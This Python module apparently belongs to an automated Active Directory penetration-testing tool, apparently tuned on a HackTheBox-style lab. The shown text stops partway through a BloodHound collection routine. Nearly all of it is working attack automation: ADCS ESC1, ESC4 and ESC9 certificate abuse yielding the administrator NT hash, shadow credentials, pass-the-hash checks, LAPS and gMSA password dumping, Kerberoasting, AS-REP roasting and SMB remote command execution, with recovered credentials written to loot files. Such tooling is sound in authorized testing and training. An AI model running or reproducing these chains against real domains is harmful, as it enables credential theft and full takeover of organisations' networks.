from __future__ import annotations

import json
import re
import subprocess
from pathlib import Path

from lib.findings import Findings, ServiceBuffer
from lib.models import Service
from lib.runner import Runner
from lib.workspace import Workspace


# ── Helpers ───────────────────────────────────────────────────────────────────

def _trim(text: str, lines: int = 60) -> str:
    ls = text.strip().splitlines()
    return "\n".join(ls[:lines]) + ("\n…" if len(ls) > lines else "")


def _has_signal(text: str) -> bool:
    """Return True if text contains meaningful findings beyond tool headers."""
    noise_prefixes = ("[*]", "[INFO]", "INFO:", "WARNING:", "Impacket v", "SMBMap -")
    return any(
        line.strip() and not line.strip().startswith(noise_prefixes)
        for line in text.strip().splitlines()
    )


def _error_lines(text: str) -> str:
    """Extract only error/warning lines from output."""
    return "\n".join(
        line for line in text.strip().splitlines()
        if any(m in line for m in ("[!]", "ERROR", "error:", "FAIL", "Could not", "strongerAuth"))
    )


_ESC_RE = re.compile(r"^ESC\d+")
_EXPLOITABLE_ESC = {"ESC1", "ESC4"}


def _parse_adcs_find(out: str) -> list[tuple[str, str, str]]:
    """Parse certipy-ad find -stdout output. Returns (ca_name, template_name, esc_variant) for any ESC variant."""
    results: list[tuple[str, str, str]] = []
    current_template: str | None = None
    current_ca: str | None = None
    in_vulns = False

    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Template Name"):
            current_template = stripped.split(":", 1)[-1].strip()
            current_ca = None
            in_vulns = False
        elif stripped.startswith("Certificate Authorities") and ":" in stripped and current_template:
            current_ca = stripped.split(":", 1)[-1].strip()
        elif stripped.startswith("[!] Vulnerabilities"):
            in_vulns = True
        elif in_vulns and _ESC_RE.match(stripped):
            esc = stripped.split(":")[0].strip()
            if current_template and current_ca:
                results.append((current_ca, current_template, esc))

    return results


def _adcs_esc4_restore(
    ip: str, domain: str, user: str, pw: str,
    template_name: str, backup_json: Path,
    runner: Runner, findings: Findings,
) -> None:
    restore_cmd = [
        "certipy-ad", "template",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-template", template_name,
        "-configuration", str(backup_json),
        "-dc-ip", ip,
    ]
    findings.cmd(" ".join(restore_cmd))
    runner.run(restore_cmd, f"adcs_esc4_restore_{template_name}", timeout=60)
    findings.note(f"ESC4: template {template_name} restored to original configuration")


def _adcs_esc_chain(
    ip: str, domain: str, user: str, pw: str,
    ca_name: str, template_name: str, esc_variant: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> None:
    """Run the certipy req → auth chain for an ESC1 or ESC4 vulnerable template."""
    exploit_dir = ws.exploit_dir
    pfx_path = exploit_dir / "administrator.pfx"

    findings.h4(f"ADCS {esc_variant}: {template_name}")

    # ── ESC4: patch template to make it ESC1-exploitable ─────────────────────
    if esc_variant == "ESC4":
        backup_json = exploit_dir / f"{template_name}_original.json"
        patch_cmd = [
            "certipy-ad", "template",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-template", template_name,
            "-save-old",
            "-dc-ip", ip,
        ]
        findings.cmd(" ".join(patch_cmd))
        out = runner.run(patch_cmd, f"adcs_esc4_patch_{template_name}", timeout=60)

        # certipy saves backup as <template>.json in CWD — move it to exploit/
        cwd_backup = Path(f"{template_name}.json")
        if cwd_backup.exists():
            cwd_backup.rename(backup_json)

        if not backup_json.exists():
            findings.note(f"ESC4 template patch failed — no backup JSON found: {_trim(out, lines=5)}")
            return

    # ── Request certificate as administrator ──────────────────────────────────
    req_cmd = [
        "certipy-ad", "req",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-ca", ca_name,
        "-template", template_name,
        "-upn", f"administrator@{domain}",
        "-dc-ip", ip,
        "-out", str(exploit_dir / "administrator"),
    ]
    findings.cmd(" ".join(req_cmd))
    out_req = runner.run(req_cmd, f"adcs_{esc_variant.lower()}_req_{template_name}", timeout=60)

    if not pfx_path.exists():
        findings.note(
            f"Certificate request failed for {template_name}: "
            f"{_error_lines(out_req) or _trim(out_req, lines=5)}"
        )
        if esc_variant == "ESC4":
            _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
        return

    findings.bullet(f"Certificate obtained → `{pfx_path.relative_to(ws.machine_dir)}`")

    # ── Authenticate with PFX → NT hash ──────────────────────────────────────
    auth_cmd = [
        "certipy-ad", "auth",
        "-pfx", str(pfx_path),
        "-dc-ip", ip,
        "-domain", domain,
        "-username", "administrator",
    ]
    findings.cmd(" ".join(auth_cmd))
    out_auth = runner.run(auth_cmd, f"adcs_{esc_variant.lower()}_auth_{template_name}", timeout=60)

    nt_hash: str | None = None
    for line in out_auth.splitlines():
        m = re.search(r"Got hash for .+?:\s*[0-9a-fA-F:]+:([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
            break

    if nt_hash:
        ws.append_hash_file("ntlm.hash", [f"administrator:{nt_hash}"])
        ws.add_cred(f"administrator:{nt_hash}")
        findings.bullet(f"**NT hash for administrator:** `{nt_hash}`")
        findings.bullet("Hash saved to `loot/ntlm.hash` — cred-reuse phase will spray it")
        findings.add_summary(f"**ADCS {esc_variant} → administrator NT hash** in `loot/ntlm.hash`")
        print(f"    [+] ADCS {esc_variant}: administrator NT hash obtained")
        _pth_verify(ip, "administrator", nt_hash, runner, findings, ws, available)
    else:
        findings.note(f"Auth step ran but no NT hash parsed: {_trim(out_auth, lines=10)}")
        print(f"    [!] ADCS {esc_variant}: auth ran but NT hash not found in output")

    # ── ESC4: restore template ────────────────────────────────────────────────
    if esc_variant == "ESC4":
        _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)


def _pth_verify(
    ip: str, user: str, nt_hash: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> bool:
    """Test NT hash via nxc SMB pass-the-hash. Returns True if valid."""
    if "nxc" not in available:
        return False
    cmd = ["nxc", "smb", ip, "-u", user, "-H", nt_hash]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"pth_smb_{user}", timeout=30)
    if "Pwn3d!" in out:
        ws.add_cred(f"{user}:{nt_hash}")
        findings.bullet(f"**PTH confirmed: `{user}` is local admin** (Pwn3d!)")
        findings.add_summary(f"PTH: {user} is local admin via NT hash")
        print(f"    [+] PTH: {user} is local admin via hash")
        return True
    elif "[+]" in out:
        ws.add_cred(f"{user}:{nt_hash}")
        findings.bullet(f"**PTH confirmed: `{user}` valid** (SMB)")
        findings.add_summary(f"PTH: {user} valid via NT hash")
        print(f"    [+] PTH: {user} valid via hash")
        return True
    findings.note(f"PTH: {user} hash not valid for SMB")
    print(f"    [-] PTH: {user} hash not valid for SMB")
    return False


def _check_laps(
    ip: str, domain: str, user: str, pw: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> None:
    if "nxc" not in available:
        return
    findings.h4("LAPS")
    # SMB first; Windows LAPS v2 stores passwords in LDAP — fall back to ldap if smb rejects it
    for proto in ("smb", "ldap"):
        cmd = ["nxc", proto, ip, "-u", user, "-p", pw, "-d", domain, "-M", "laps"]
        out = runner.run(cmd, f"creds_laps_{proto}", timeout=30)
        if "not supported for protocol" in out or ("invalid choice" in out and "laps" not in out.lower().split("invalid choice")[0]):
            continue
        findings.cmd(" ".join(cmd))
        findings.code_block(_trim(out, lines=20))
        for line in out.splitlines():
            m = re.search(r"Computer:\s*(\S+)\s*,\s*LAPS Password:\s*(\S+)", line)
            if m:
                computer, laps_pw = m.group(1).rstrip("$"), m.group(2)
                ws.add_cred(f"administrator:{laps_pw}")
                ws.append_hash_file("laps.txt", [f"{computer}:administrator:{laps_pw}"])
                findings.bullet(f"**LAPS password for `{computer}$`:** `{laps_pw}`")
                findings.add_summary(f"LAPS: administrator@{computer} password in loot/laps.txt")
                print(f"    [+] LAPS: {computer}$ → administrator password found")
        break


def _check_gmsa(
    ip: str, domain: str, user: str, pw: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> None:
    findings.h4("gMSA Passwords")

    nxc_ok = False
    if "nxc" in available:
        cmd = ["nxc", "ldap", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_gmsa", timeout=30)
        if "invalid choice: 'gmsa'" in out or ("invalid choice" in out and "'gmsa'" in out):
            findings.note("gMSA module not available in this nxc version — falling back to ldapsearch")
            print(f"    [-] gMSA: nxc module unavailable, trying ldapsearch")
        else:
            nxc_ok = True
            findings.code_block(_trim(out, lines=20))
            for line in out.splitlines():
                m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", line)
                if m:
                    acct, nt_hash = m.group(1), m.group(2)
                    ws.add_cred(f"{acct}:{nt_hash}")
                    ws.append_hash_file("ntlm.hash", [f"{acct}:{nt_hash}"])
                    findings.bullet(f"**gMSA NT hash for `{acct}`:** `{nt_hash}`")
                    findings.add_summary(f"gMSA: {acct} NT hash in loot/ntlm.hash")
                    print(f"    [+] gMSA: {acct} NT hash obtained")

    if not nxc_ok and "ldapsearch" in available and domain:
        # Fallback: query gMSA accounts directly via LDAP
        base_dn = "DC=" + ",DC=".join(domain.split("."))
        uri = f"ldap://{ip}"
        cmd_ld = [
            "ldapsearch", "-x", "-H", uri,
            "-D", f"{user}@{domain}", "-w", pw,
            "-b", base_dn,
            "(objectClass=msDS-GroupManagedServiceAccount)",
            "sAMAccountName", "msDS-ManagedPassword",
        ]
        findings.cmd(" ".join(cmd_ld))
        out_ld = runner.run(cmd_ld, "creds_gmsa_ldap", timeout=30)
        findings.code_block(_trim(out_ld, lines=20))
        accts = re.findall(r"sAMAccountName:\s+(\S+)", out_ld)
        if accts:
            findings.bullet(f"**gMSA accounts found:** {', '.join(accts)}")
            findings.note("gMSA msDS-ManagedPassword requires elevated rights to read — note account names for post-escalation")
            print(f"    [+] gMSA accounts: {', '.join(accts)}")
        else:
            findings.note("No gMSA accounts found or insufficient rights")
            print(f"    [-] No gMSA accounts")


def _bloodyad_writable(
    ip: str, domain: str, user: str, pw: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> list[str]:
    """Return sAMAccountNames of user objects the current user has write access to."""
    if "bloodyAD" not in available:
        return []

    def _san(s: str) -> str:
        return re.sub(r"[\s._-]", "", s).lower()

    def _parse_writable(out: str, otype: str) -> list[str]:
        results: list[str] = []
        current_sam: str | None = None
        current_dn_cn: str | None = None

        def _emit() -> None:
            name = current_sam or current_dn_cn
            skip_self = _san(name) == _san(user) if name else True
            if name and not skip_self and name not in results:
                results.append(name)

        for line in out.splitlines():
            s = line.strip()
            if s.lower().startswith("distinguishedname:"):
                _emit()
                current_sam = None
                m_cn = re.search(r"CN=([^,]+)", s)
                current_dn_cn = m_cn.group(1) if m_cn else None
            elif s.lower().startswith("samaccountname:"):
                current_sam = s.split(":", 1)[-1].strip()
        _emit()
        return results

    findings.h4("Writable AD Objects (bloodyAD)")
    all_targets: list[str] = []

    for otype, label_suffix in (("USER", "writable"), ("GROUP", "writable_groups"), ("COMPUTER", "writable_computers")):
        cmd = ["bloodyAD", "--host", ip, "-d", domain, "-u", user, "-p", pw,
               "get", "writable", "--otype", otype]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"creds_bloodyad_{label_suffix}", timeout=60)
        if out.strip():
            findings.code_block(_trim(out, lines=30))
        found = _parse_writable(out, otype)
        # For users: exclude machine accounts; for computers: include (they end in $)
        if otype != "COMPUTER":
            found = [f for f in found if not f.endswith("$")]
        if found:
            findings.bullet(f"**Writable {otype.lower()} objects:** {', '.join(f'`{t}`' for t in found)}")
            findings.add_summary(f"bloodyAD: write access over {otype.lower()}(s): {', '.join(found)}")
            print(f"        [+] Writable {otype.lower()}: {', '.join(found)}")
            if otype == "USER":
                all_targets.extend(found)
        else:
            findings.note(f"No writable {otype.lower()} objects found")
            print(f"        [-] No writable {otype.lower()} objects")

    return all_targets


def _shadow_creds_chain(
    ip: str, domain: str, user: str, pw: str,
    targets: list[str],
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> dict[str, str]:
    """Run certipy-ad shadow auto against writable targets. Returns {sam: nt_hash}."""
    if "certipy-ad" not in available or not targets:
        return {}
    hashes: dict[str, str] = {}
    for target in targets:
        findings.h4(f"Shadow Credentials: {target}")
        cmd = [
            "certipy-ad", "shadow", "auto",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-account", target,
            "-dc-ip", ip,
        ]
        findings.cmd(" ".join(cmd))
        print(f"    [*] Shadow credentials against {target}...")
        out = runner.run(cmd, f"creds_shadow_{target}", timeout=90)
        findings.code_block(_trim(out, lines=30))

        nt_hash: str | None = None
        for line in out.splitlines():
            m = re.search(r"NT hash for .+?:\s*([0-9a-fA-F]{32})", line)
            if m:
                nt_hash = m.group(1)
                break
        if nt_hash:
            hashes[target] = nt_hash
            ws.append_hash_file("ntlm.hash", [f"{target}:{nt_hash}"])
            ws.add_cred(f"{target}:{nt_hash}")
            findings.bullet(f"**NT hash for `{target}`:** `{nt_hash}`")
            findings.add_summary(f"Shadow credentials → {target} NT hash in loot/ntlm.hash")
            print(f"    [+] Shadow creds: {target} NT hash obtained")
            _pth_verify(ip, target, nt_hash, runner, findings, ws, available)
        else:
            errors = _error_lines(out)
            if errors:
                findings.note(f"Shadow creds failed for {target}: {errors}")
            print(f"    [-] Shadow creds: no NT hash for {target}")
    return hashes


def _esc9_chain(
    ip: str, domain: str, user: str, pw: str,
    ca_name: str, template_name: str,
    writable_user: str, writable_hash: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> None:
    """
    ESC9: change writable_user UPN → administrator@domain (using attacker creds),
    request cert as writable_user (via their NT hash from shadow credentials),
    restore UPN, then auth → administrator NT hash.
    """
    exploit_dir = ws.exploit_dir
    old_upn = f"{writable_user}@{domain}"
    findings.h4(f"ADCS ESC9: {template_name} via {writable_user}")

    update_cmd = [
        "certipy-ad", "account", "update",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-user", writable_user,
        "-upn", f"administrator@{domain}",
        "-dc-ip", ip,
    ]
    findings.cmd(" ".join(update_cmd))
    out = runner.run(update_cmd, f"adcs_esc9_upn_set_{writable_user}", timeout=60)
    if "Successfully" not in out and "updated" not in out.lower():
        findings.note(f"ESC9: UPN update failed — {_trim(out, lines=3)}")
        print(f"    [!] ESC9: UPN update failed for {writable_user}")
        return

    pfx_name = f"esc9_{writable_user}"
    pfx_path = exploit_dir / f"{pfx_name}.pfx"
    req_cmd = [
        "certipy-ad", "req",
        "-u", f"{writable_user}@{domain}",
        "-hashes", f":{writable_hash}",
        "-ca", ca_name,
        "-template", template_name,
        "-dc-ip", ip,
        "-out", str(exploit_dir / pfx_name),
    ]
    findings.cmd(" ".join(req_cmd))
    out_req = runner.run(req_cmd, f"adcs_esc9_req_{writable_user}", timeout=60)

    restore_cmd = [
        "certipy-ad", "account", "update",
        "-u", f"{user}@{domain}",
        "-p", pw,
        "-user", writable_user,
        "-upn", old_upn,
        "-dc-ip", ip,
    ]
    findings.cmd(" ".join(restore_cmd))
    runner.run(restore_cmd, f"adcs_esc9_upn_restore_{writable_user}", timeout=60)
    findings.note(f"ESC9: UPN for {writable_user} restored to {old_upn}")

    if not pfx_path.exists():
        findings.note(f"ESC9 cert request failed: {_error_lines(out_req) or _trim(out_req, lines=5)}")
        print(f"    [!] ESC9: cert request failed for {writable_user}")
        return

    findings.bullet(f"Certificate obtained → `{pfx_path.relative_to(ws.machine_dir)}`")

    auth_cmd = [
        "certipy-ad", "auth",
        "-pfx", str(pfx_path),
        "-dc-ip", ip,
        "-domain", domain,
        "-username", "administrator",
    ]
    findings.cmd(" ".join(auth_cmd))
    out_auth = runner.run(auth_cmd, f"adcs_esc9_auth_{writable_user}", timeout=60)

    nt_hash: str | None = None
    for line in out_auth.splitlines():
        m = re.search(r"Got hash for .+?:\s*[0-9a-fA-F:]+:([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
            break

    if nt_hash:
        ws.append_hash_file("ntlm.hash", [f"administrator:{nt_hash}"])
        ws.add_cred(f"administrator:{nt_hash}")
        findings.bullet(f"**NT hash for administrator (ESC9):** `{nt_hash}`")
        findings.add_summary(f"**ADCS ESC9 → administrator NT hash** in `loot/ntlm.hash`")
        print(f"    [+] ESC9: administrator NT hash obtained")
        _pth_verify(ip, "administrator", nt_hash, runner, findings, ws, available)
    else:
        findings.note(f"ESC9 auth ran but no NT hash: {_trim(out_auth, lines=10)}")
        print(f"    [!] ESC9: auth ran but no NT hash extracted")


def _parse_nosec_templates(out: str) -> list[tuple[str, str]]:
    """Find templates with NoSecurityExtension + Client Authentication from -enabled output.
    Returns (ca_name, template_name) for potential ESC9 targets regardless of enrollment rights."""
    results: list[tuple[str, str]] = []
    current_template: str | None = None
    current_ca: str | None = None
    client_auth = False
    nosec = False

    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Template Name"):
            if current_template and current_ca and client_auth and nosec:
                results.append((current_ca, current_template))
            current_template = stripped.split(":", 1)[-1].strip()
            current_ca = None
            client_auth = False
            nosec = False
        elif current_template and stripped.startswith("Certificate Authorities") and ":" in stripped:
            current_ca = stripped.split(":", 1)[-1].strip()
        elif current_template and stripped.startswith("Client Authentication") and ":" in stripped:
            client_auth = "True" in stripped
        elif current_template and "NoSecurityExtension" in stripped:
            nosec = True

    if current_template and current_ca and client_auth and nosec:
        results.append((current_ca, current_template))

    return results


def _sync_time(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
    if "ntpdate" not in available:
        findings.note("ntpdate not available — Kerberos may fail if clock skew > 5 min")
        return
    subprocess.run(["timedatectl", "set-ntp", "false"], capture_output=True)
    cmd = ["ntpdate", "-u", ip]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, "time_sync_ntpdate", timeout=30)
    first_line = next((l for l in out.splitlines() if l.strip()), "")
    if first_line:
        findings.note(f"Time sync to {ip}: {first_line.strip()}")
    print(f"    [*] Time synced to DC {ip}")


def _parse_ldapdomaindump_users(out_dir: str, ws: Workspace) -> int:
    """Parse domain_users JSON (primary) or HTML (fallback) and populate ws users.txt."""
    out_path = Path(out_dir)
    count = 0

    # JSON is the most reliable format — try it first
    json_file = out_path / "domain_users.json"
    if json_file.exists():
        try:
            entries = json.loads(json_file.read_text(errors="replace"))
            for entry in entries:
                attrs = entry.get("attributes", {})
                sam = attrs.get("sAMAccountName", [])
                if isinstance(sam, list):
                    sam = sam[0] if sam else ""
                sam = str(sam).strip()
                if sam and not sam.endswith("$"):
                    ws.add_user(sam)
                    count += 1
            if count:
                return count
        except Exception:
            pass

    # HTML fallback
    html_file = out_path / "domain_users.html"
    if not html_file.exists():
        return 0
    html = html_file.read_text(errors="replace")

    headers = [re.sub(r"<[^>]+>", "", h).strip().lower()
               for h in re.findall(r"<th[^>]*>(.*?)</th>", html, re.IGNORECASE | re.DOTALL)]
    sam_idx = next((i for i, h in enumerate(headers) if "samaccountname" in h), None)
    if sam_idx is None:
        return 0

    for row in re.finditer(r"<tr[^>]*>(.*?)</tr>", html, re.IGNORECASE | re.DOTALL):
        cells = re.findall(r"<td[^>]*>(.*?)</td>", row.group(1), re.IGNORECASE | re.DOTALL)
        if len(cells) > sam_idx:
            name = re.sub(r"<[^>]+>", "", cells[sam_idx]).strip()
            if name and not name.endswith("$"):
                ws.add_user(name)
                count += 1
    return count


# ── Credential loading ────────────────────────────────────────────────────────

def load_creds(
    username: str | None,
    password: str | None,
    creds_file: str | None,
) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    if username and password:
        pairs.append((username, password))
    if creds_file:
        p = Path(creds_file)
        if not p.exists():
            print(f"[!] Creds file not found: {creds_file}")
        else:
            for line in p.read_text().splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    user, _, pw = line.partition(":")
                    pairs.append((user.strip(), pw.strip()))
    seen: set[tuple[str, str]] = set()
    return [pair for pair in pairs if not (pair in seen or seen.add(pair))]  # type: ignore[func-returns-value]


# ── SMB credential validation ─────────────────────────────────────────────────

def _validate_smb(
    ip: str,
    creds: list[tuple[str, str]],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping SMB credential validation")
        return [], []

    findings.h3("Credential Validation — SMB")
    valid: list[tuple[str, str]] = []
    admin: list[tuple[str, str]] = []
    rows: list[list[str]] = []

    for user, pw in creds:
        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--no-bruteforce"]
        out = runner.run(cmd, f"creds_smb_val_{user}", timeout=30)
        if "Pwn3d!" in out:
            status = "VALID (ADMIN)"
            ws.add_valid_cred(user, pw, "SMB")
            findings.add_summary(f"Admin SMB creds: `{user}`")
            valid.append((user, pw))
            admin.append((user, pw))
            print(f"    [+] {user}: ADMIN on SMB")
        elif "[+]" in out:
            status = "VALID"
            ws.add_valid_cred(user, pw, "SMB")
            valid.append((user, pw))
            print(f"    [+] {user}: valid SMB")
        else:
            status = "invalid"
            print(f"    [-] {user}: invalid SMB")
        rows.append([user, pw[:2] + "***", status])

    findings.table(["User", "Password", "SMB"], rows)
    return valid, admin


# ── AD Core ───────────────────────────────────────────────────────────────────

def _smb_admin_exec(
    ip: str, domain: str, user: str, pw: str,
    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
) -> None:
    """Run standard Windows enumeration commands via SMB exec (requires admin / Pwn3d! access)."""
    if "nxc" not in available:
        return
    findings.h4(f"Admin Command Execution — {user}")
    print(f"    [*] SMB admin exec as {user}...")
    smb_cmds = [
        ("whoami /all",                                                                      f"creds_smb_exec_whoami_{user}"),
        ("net localgroup administrators",                                                    f"creds_smb_exec_localadmins_{user}"),
        ('net group "Domain Admins" /domain',                                               f"creds_smb_exec_domainadmins_{user}"),
        ("ipconfig /all",                                                                    f"creds_smb_exec_ipconfig_{user}"),
        ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"', f"creds_smb_exec_sysinfo_{user}"),
    ]
    for smb_cmd, label in smb_cmds:
        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw]
        if domain:
            cmd += ["-d", domain]
        cmd += ["-x", smb_cmd]
        findings.cmd(f"nxc smb {ip} -u {user} -p *** -x \"{smb_cmd}\"")
        out = runner.run(cmd, label, timeout=30)
        findings.code_block(_trim(out))
    print(f"    [+] Admin exec complete")


def _ad_core(
    ip: str,
    domain: str,
    user: str,
    pw: str,
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
    admin_smb: list[tuple[str, str]] | None = None,
) -> None:
    findings.h3("AD Core Enumeration")

    # 0. Time sync — Kerberos requires clock skew < 5 minutes vs DC
    _sync_time(ip, runner, findings, available)

    # 1. ldapdomaindump — authenticated full domain dump; LDAPS fallback if LDAP requires TLS
    if "ldapdomaindump" in available:
        out_dir = str(ws.loot_dir / "ldapdomaindump")
        cmd = [
            "ldapdomaindump",
            "-u", f"{domain}\\{user}",
            "-p", pw,
            "--no-grep",
            "-o", out_dir,
            f"ldap://{ip}",
        ]
        print(f"    [*] ldapdomaindump...")
        findings.h4("LDAP Domain Dump")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_ldapdomaindump", timeout=120)
        errors = _error_lines(out)
        if errors:
            findings.code_block(errors)
            if "strongerAuthRequired" in out or "Could not bind" in out:
                cmd_ldaps = cmd[:-1] + [f"ldaps://{ip}"]
                findings.cmd(" ".join(cmd_ldaps))
                print(f"    [*] LDAP requires TLS — retrying with LDAPS...")
                out2 = runner.run(cmd_ldaps, "creds_ldapdomaindump_ldaps", timeout=120)
                errors2 = _error_lines(out2)
                if errors2:
                    findings.code_block(errors2)
                    print(f"    [!] ldapdomaindump failed (LDAP + LDAPS)")
                else:
                    findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
                    added = _parse_ldapdomaindump_users(out_dir, ws)
                    if added:
                        findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
                        print(f"    [+] ldapdomaindump (LDAPS) complete — {added} users added to users.txt")
                    else:
                        print(f"    [+] ldapdomaindump (LDAPS) complete")
            else:
                print(f"    [!] ldapdomaindump error")
        else:
            findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
            added = _parse_ldapdomaindump_users(out_dir, ws)
            if added:
                findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
                print(f"    [+] ldapdomaindump complete — {added} users added to users.txt")
            else:
                print(f"    [+] ldapdomaindump complete")

    # Print users.txt contents after ldapdomaindump (or from prior scan phase)
    _users_path = ws.loot_dir / "users.txt"
    if _users_path.exists():
        _user_lines = [l.strip() for l in _users_path.read_text().splitlines() if l.strip()]
        if _user_lines:
            for _u in _user_lines[:12]:
                print(f"        {_u}")
            if len(_user_lines) > 12:
                print(f"        ... ({len(_user_lines) - 12} more in loot/users.txt)")

    # 2. Kerberoasting — SPN accounts → crackable hashes
    if "impacket-GetUserSPNs" in available:
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}:{pw}",
            "-dc-ip", ip,
            "-request",
        ]
        print(f"    [*] Kerberoasting (GetUserSPNs)...")
        findings.h4("Kerberoasting (GetUserSPNs)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getuserspns", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
        # Extract account names from the SPN table (lines with SPN column data)
        spn_accounts = re.findall(
            r"^certified\.htb/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
        ) or re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
        if hashes:
            added = ws.append_hash_file("kerberoast.hash", hashes)
            acct_str = f" — account(s): {', '.join(f'`{a}`' for a in spn_accounts)}" if spn_accounts else ""
            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`{acct_str}")
            findings.add_summary(f"{len(hashes)} Kerberoastable: {', '.join(spn_accounts) or 'unknown'} — crack with hashcat -m 13100")
            print(f"    [+] {len(hashes)} Kerberoastable hashes ({added} new){' — ' + ', '.join(spn_accounts) if spn_accounts else ''}")
            print(f"        → loot/kerberoast.hash  [hashcat -m 13100]")
        else:
            if "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No Kerberoastable SPNs found")
            print(f"    [-] No Kerberoastable SPNs")

    # 3. AS-REP roasting — authenticated enumeration (no -all flag; creds give full user list)
    if "impacket-GetNPUsers" in available:
        users_file = ws.loot_dir / "users.txt"
        if users_file.exists():
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", ip,
                "-no-pass",
                "-request",
                "-usersfile", str(users_file),
            ]
        else:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{user}:{pw}",
                "-dc-ip", ip,
                "-request",
            ]
        print(f"    [*] AS-REP roasting (GetNPUsers)...")
        findings.h4("AS-REP Roasting (GetNPUsers)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getnpusers_auth", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5asrep$" in line]
        if hashes:
            added = ws.append_hash_file("asrep.hash", hashes)
            findings.bullet(f"**{len(hashes)} AS-REP hashes** ({added} new) → `loot/asrep.hash`")
            findings.add_summary(f"{len(hashes)} AS-REP roastable accounts — crack with hashcat -m 18200")
            print(f"    [+] {len(hashes)} AS-REP hashes ({added} new)")
            print(f"        → loot/asrep.hash  [hashcat -m 18200]")
        else:
            if "KRB5" in out or "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No AS-REP roastable accounts found")
            print(f"    [-] No AS-REP roastable accounts")

    # 4. BloodHound collection — NTLM auth avoids Kerberos hostname resolution failures
    if "bloodhound-python" in available:
        bh_dir = Path(ws.bloodhound_dir)
        bh_dir.mkdir(parents=True, exist_ok=True)
        findings.h4("BloodHound Collection")
        print(f"    [*] BloodHound collection (All)...")

        def _bh_relocate_json() -> None:
            """Move bloodhound JSON files from loot_dir into bh_dir if they landed outside it."""
            import re as _re
            bh_json_pattern = _re.compile(r"^\d{14}_\w+\.json$")
            for f in ws.loot_dir.iterdir():
                if f.is_file() and bh_json_pattern.match(f.name):
                    dest = bh_dir / f.name
                    if not dest.exists():
                        f.replace(dest)

        def _bh_find_zip(zip_name: str | None) -> "Path | None":
            """Search bh_dir, loot_dir, and machine_dir for a bloodhound zip; relocate if needed."""
            search_dirs = [bh_dir, ws.loot_dir, ws.machine_dir]
            # Named zip first
            if zip_name:
                for d in search_dirs:
                    candidate = d / zip_name
                    if candidate.exists() and candidate.stat().st_size > 1000:
                        if candidate.parent != bh_dir:
                            dest = bh_dir / zip_name
                            candidate.replace(dest)
                            return dest
                        return candidate
            # Any large zip anywhere under machine_dir
            all_zips = sorted(
                (z for z in ws.machine_dir.rglob("*.zip") if z.stat().st_size > 1000),
                key=lambda z: z.stat().st_size, reverse=True,
            )
            if all_zips:
                z = all_zips[0]
                if z.parent != bh_dir:
                    dest = bh_dir / z.name
                    z.replace(dest)
                    return dest
                return z
            return None

        def _bh_run(collection: str, label: str) -> "Path | None":
            cmd = [
                "bloodhound-python",
                "-c", collection,
                "-u", user,
                "-p", pw,
                "-d", domain,
                "--auth-method", "ntlm",
                "--dns-tcp",
                "--zip",
                "-o", str(bh_dir),
                "-ns", ip,
            ]
            findings.cmd(" ".join(cmd))
            # Run from bh_dir so the zip lands there regardless of bloodhound-python version
            out = runner.run(cmd, label, timeout=300, cwd=str(bh_dir))

            # Relocate any JSON files that landed in loot_dir instead of bh_dir
            _bh_relocate_json()

            # Parse zip filename from "Compressing output into X.zip"
            m = re.search(r"Compressing output into\s+(\S+\.zip)", out)
            zip_name = Path(m.group(1)).name if m else None
            return _bh_find_zip(zip_name)

        zip_path = _bh_run("All", "creds_bloodhound")
